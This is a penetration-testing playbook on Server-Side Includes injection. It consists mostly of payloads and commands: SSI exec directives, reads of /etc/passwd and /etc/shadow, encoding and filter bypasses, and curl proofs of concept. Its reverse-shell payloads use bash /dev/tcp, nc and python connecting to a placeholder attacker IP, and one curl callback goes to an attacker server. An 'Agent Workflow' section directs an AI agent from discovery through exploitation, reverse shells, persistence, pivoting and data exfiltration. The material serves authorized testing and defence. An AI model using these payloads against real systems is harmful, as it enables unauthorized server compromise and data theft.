# Server-Side Includes (SSI) Injection

> **Summary**: Inject SSI directives into web pages processed by a server that supports Server-Side Includes, achieving command execution or information disclosure.
> **Impact**: Remote code execution, local file inclusion, information disclosure, defacement.
> **Typical Severity**: High - Critical

## Detection

### Indicators
- Web server is Apache with `mod_include` enabled, or Nginx with `ngx_http_ssi_module`
- Pages use `.shtml`, `.stm`, or `.shtm` extensions (classic SSI extensions)
- SSI directives appear in page source (`<!--#` patterns)
- Error messages mention SSI processing errors
- Server header reveals Apache/IIS with SSI support

### Automated Detection
```bash
# Inject SSI directive in input fields and observe response
# If <!--#echo var="DATE_LOCAL"--> returns a date, SSI is processed

# Burp Suite Active Scanner detects SSI injection
# Nuclei templates for SSI
nuclei -u http://<TARGET> -t http/vulnerabilities/ -tags ssi
```

### Manual Detection
```bash
# Basic test -- inject in any user-controlled input (params, headers, uploads)
<!--#echo var="DATE_LOCAL"-->

# If reflected and processed, the server date appears instead of raw directive
# If reflected but not processed, the raw directive appears in the response

# Test via URL parameter
curl "http://<TARGET>/page?name=<!--%23echo%20var='DATE_LOCAL'-->"

# Test via User-Agent or Referer
curl -H "User-Agent: <!--#echo var='DATE_LOCAL'-->" http://<TARGET>/page
```

## Exploitation

### Prerequisites
- Server has SSI processing enabled (`mod_include` for Apache, `ssi on` for Nginx)
- User input is reflected into SSI-processed pages
- No sanitization of `<!--#` sequences in user input

### Step-by-Step
1. **Identify SSI support** -- look for `.shtml` extensions, test with `<!--#echo var="DATE_LOCAL"-->`
2. **Find injection point** -- test parameters, headers, file upload names, or form fields
3. **Inject info-disclosure directive** -- confirm execution with `<!--#echo var="DOCUMENT_NAME"-->`
4. **Escalate to command execution** -- inject `<!--#exec cmd="id"-->`
5. **Success criteria**: Server processes directive and returns command output or variable values in the response

### SSI Directives Reference

| Directive | Syntax | Purpose |
|-----------|--------|---------|
| Print date | `<!--#echo var="DATE_LOCAL" -->` | Display server date |
| Print document name | `<!--#echo var="DOCUMENT_NAME" -->` | Display current filename |
| Print all variables | `<!--#printenv -->` | Dump all SSI environment variables |
| Execute command | `<!--#exec cmd="<COMMAND>" -->` | Execute OS command |
| Execute CGI | `<!--#exec cgi="/cgi-bin/script.cgi" -->` | Execute CGI script |
| Include file | `<!--#include virtual="/etc/passwd" -->` | Include a file from filesystem |
| Include virtual | `<!--#include virtual="/index.html" -->` | Include via virtual path |
| Set variable | `<!--#set var="name" value="test" -->` | Set a variable |
| Conditional | `<!--#if expr="$name = test" -->` | Conditional rendering |
| Configure error | `<!--#config errmsg="Error!" -->` | Custom error message |
| Configure time | `<!--#config timefmt="%Y-%m-%d" -->` | Set time format |

### Payloads

#### Information Disclosure
```html
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#echo var="LAST_MODIFIED" -->
<!--#echo var="SERVER_SOFTWARE" -->
<!--#echo var="SERVER_NAME" -->
<!--#echo var="REMOTE_ADDR" -->
<!--#printenv -->
```

#### Command Execution
```html
<!--#exec cmd="id" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="ls -la" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="uname -a" -->
```

#### Reverse Shell
```html
<!--#exec cmd="bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1" -->
<!--#exec cmd="nc <ATTACKER_IP> <PORT> -e /bin/sh" -->
<!--#exec cmd="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ATTACKER_IP>\",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" -->
```

#### Local File Inclusion
```html
<!--#include virtual="/etc/passwd" -->
<!--#include virtual="/etc/shadow" -->
<!--#include virtual="/.htpasswd" -->
<!--#include file="config.php" -->
```

### Proof of Concept
```bash
# Step 1: Test for SSI processing
curl "http://<TARGET>/page?input=<!--%23echo%20var='DATE_LOCAL'-->"

# Step 2: If date appears in response, escalate to command execution
curl "http://<TARGET>/page?input=<!--%23exec%20cmd='id'-->"

# Step 3: Confirm RCE with out-of-band callback
curl "http://<TARGET>/page?input=<!--%23exec%20cmd='curl%20http://<ATTACKER_SERVER>/proof'-->"
```

## Bypasses

### Encoding Bypasses
```
# URL encoding
%3C!--%23exec%20cmd=%22id%22--%3E

# Double URL encoding
%253C!--%2523exec%2520cmd=%2522id%2522--%253E

# Unicode encoding
\u003c!--#exec cmd="id"--\u003e

# Mixed case (does NOT work -- SSI directives are case-sensitive)
```

### Filter Bypass
```html
<!-- Bypass filters blocking "exec cmd" -->
<!--#exec cmd="i""d" -->
<!--#exec cmd="i\d" -->

<!-- Use include instead of exec -->
<!--#include virtual="/proc/self/environ" -->

<!-- Chain with set directive -->
<!--#set var="cmd" value="id" -->
<!--#exec cmd="$cmd" -->
```

### Content-Type Manipulation
Upload a file with `.shtml` extension or manipulate the server to process a non-standard extension through SSI.

## Escalation
- **Information disclosure** --> enumerate server paths, software versions, environment
- **File read** --> access sensitive configuration files, credentials
- **RCE** --> full server compromise via `exec cmd`
- **Lateral movement** --> read internal configs, database credentials
- **Defacement** --> modify page content via include directives

## Tools

| Tool | Usage |
|------|-------|
| Burp Suite | Inject SSI payloads via Repeater/Intruder |
| curl | `curl "http://<TARGET>/page?q=<!--%23exec%20cmd='id'-->"` |
| ffuf | Fuzz parameters with SSI payload wordlist |
| Nuclei | `nuclei -u <TARGET> -tags ssi` |
| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection) | SSI payload reference |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for SSI injection.

### Phase 1: Discovery
1. Check if the server supports SSI: look for `.shtml`, `.stm`, `.shtm` extensions, Apache `mod_include`, or Nginx `ssi on` directives.
2. Identify user input reflected in SSI-processed pages: URL parameters, form fields, headers (User-Agent, Referer), and file upload names.
3. Look for `<!--#` patterns in existing page source that indicate SSI is actively used.

### Phase 2: Validation
1. **Info disclosure probe** -- inject `<!--#echo var="DATE_LOCAL"-->` in a text field or URL parameter:
   ```
   https://<TARGET>/page?name=<!--%23echo%20var='DATE_LOCAL'-->
   ```
   If the server date appears in the response, SSI injection is confirmed.
2. **Via headers** -- inject the probe in `User-Agent` or `Referer` headers if those are reflected in SSI-processed logs or error pages.
3. Test URL-encoded variants: `%3C!--%23echo%20var%3D'DATE_LOCAL'--%3E` for double-encoding bypass.

### Phase 3: Exploitation
1. **Command execution** -- inject `<!--#exec cmd="id"-->` to execute OS commands:
   ```
   https://<TARGET>/page?name=<!--%23exec%20cmd='id'-->
   ```
2. **File inclusion** -- read sensitive files with `<!--#include virtual="/etc/passwd"-->`.
3. **Reverse shell** -- execute a reverse shell payload:
   ```
   <!--#exec cmd="bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'"-->
   ```

### Phase 4: Escalation
1. Chain with [Command Injection](command-injection.md) for full RCE via `<!--#exec cmd="...">`.
2. Chain with [LFI](lfi.md) using `<!--#include virtual="...">` to read sensitive configuration files.
3. Use RCE to establish persistence, pivot to internal network, or exfiltrate data.

## Decision Tree

```
Start: Identify SSI support (.shtml extensions, mod_include, ssi on)
  |
  +---> User input reflected in SSI-processed page?
  |       +---> Yes: Inject <!--#echo var="DATE_LOCAL"-->
  |       |       +---> Date returned? --> SSI injection confirmed
  |       |       +---> Raw directive shown? --> SSI not processing this context
  |       +---> No reflection: Test headers (User-Agent, Referer)
  |
  +---> SSI injection confirmed?
          +---> <!--#exec cmd="id"--> --> OS command execution
          +---> <!--#include virtual="/etc/passwd"--> --> File read
          +---> <!--#exec cmd="reverse shell"--> --> Full RCE
```

## Success Criteria
- [ ] SSI support confirmed on the target server
- [ ] SSI directive evaluated from user-controlled input (`DATE_LOCAL` returned)
- [ ] OS command execution achieved via `<!--#exec cmd="..."-->`
- [ ] If file read: sensitive file contents retrieved via `<!--#include virtual="..."-->`

## References
- [OWASP - SSI Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)
- [PayloadsAllTheThings - SSI Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection)
- [Apache mod_include documentation](https://httpd.apache.org/docs/current/mod/mod_include.html)

## See Also
- [Command Injection](command-injection.md)
- [SSTI](ssti.md)
- [LFI](lfi.md)
